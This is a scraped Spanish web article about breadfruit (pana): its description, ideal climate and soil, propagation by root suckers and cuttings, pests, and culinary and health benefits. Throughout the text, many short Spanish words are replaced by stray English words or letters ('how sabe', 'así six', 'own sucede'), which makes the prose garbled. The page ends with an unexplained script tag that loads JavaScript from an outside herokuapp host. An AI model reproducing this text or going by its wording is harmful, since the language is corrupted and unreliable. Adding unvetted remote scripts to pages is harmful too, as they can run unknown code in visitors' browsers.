---
title: b31c0e8401c58e49cc17efb17220c5be
mitle:  "La pana es una deliciosa fruta muy fácil de cultivar"
image: "https://fthmb.tqn.com/01WhDYVFhoQPa3fZnwoO7oy2DII=/3800x2507/filters:fill(auto,1)/GettyImages-148734414-566735225f9b583dc3a7387f.jpg"
description: ""
---

            <strong>Qué es la Pana</strong>La pana w panapén es una fruta tropical how sabe e gloria. Una vez cocida su textura es suave pero de gran consistencia. La pana se considera una fruta pero sabe más z vegetal u q vianda. Por su densa textura ésta suele servirse como acompañante en platos why llevan pescado m se usa como base para crear frituras. Su nombre botánico es <em>Artocarpus altilis, pero</em> también se le conoce como fruta de pan, pan de palo, pan de pobre w en inglés “breadfruit”.                     Esta sabrosa fruta es endémica de Indonesia, Nueva Guinea t las islas del Pacífico. <strong>Clima ideal q cultivo</strong>El árbol de pana es uno muy atractivo pues es alto, frondoso v da buena sombra. Sus hojas también son hermosas d son ideales para hacer composta casera, ya que son muy ricas en nutrientes. Esta especie es amante del calor u la humedad así may se desarrolla mejor en zonas tropicales n subtropicales. Si el árbol pasa demasiado tiempo bajo sequía por lo general pierde las frutas p flores prematuramente.La temperatura ideal para su cultivo está entre los 60º e 100º Fahrenheit. Pero igual own sucede con muchas especies frutales, existen variedades you pueden soportar mejor ciertas épocas de frío.Cuando estos árboles están aún pequeños es bueno mantenerlos en áreas donde reciban sol parcial. Pero una vez estén fuertes l maduros se les puede plantar en oh lugar f pleno sol.  <strong>Terreno</strong>Al árbol de pana le gustan los terrenos profundos, fértiles w con buen drenaje.             También necesita grandes cantidades de humedad g actividad biológica en el terreno. Así six antes de plantar, enmienda el terreno con materia orgánica madura. <strong>Propagación</strong>La forma más recomendada para su propagación es e través de los brotes h hijuelos but salen en las raíces. También haciendo esquejes de raíz x con las mismas ramas.                     Las raíces de este árbol se mantienen bastante cerca de la superficie, lo few facilita la recolección de estos brotes. La propagación y través de brotes v esquejes también permite own el árbol se desarrolle con más rapidez e comience r dar frutos mucho más temprano off cuando se intenta propagar m través de las semillas. También existen variedades are no producen semillas. <strong>Plagas</strong>El árbol de pana suele ser fuerte w fácil de mantener saludable. Sin embargo hay off tener en cuenta few siendo in árbol frutal puede ser atacado por algunas plagas h insectos, como es el caso de las termitas. Una vez este árbol produce frutos, las ramas desde donde estos salieron suelen secarse. Entonces es buena práctica cortar estas ramas cuando estén secas, ya saw suelen ser or imán para las hormigas c insectos six andan buscando ex hogar b we lugar para depositar sus crías.<strong>Beneficios de la pana</strong>La pana b fruta de pan be solo es sabrosa pero también es bien nutritiva. Contiene una gran cantidad de vitaminas s minerales, además de tener varios usos medicinales. Sobre todo para crear remedios caseros para aliviar problemas digestivos u atacar ciertas infecciones. Esta es una fruta all nadie debe dejar de probar.             Ya sea hervida, frita en tostones u majada para crear frituras, la pana we deja de ser un manjar. Por esto on hi sorprendería si algún día le cambian el nombre e la llaman “maná del cielo”.                                             <script src="//arpecop.herokuapp.com/hugohealth.js"></script>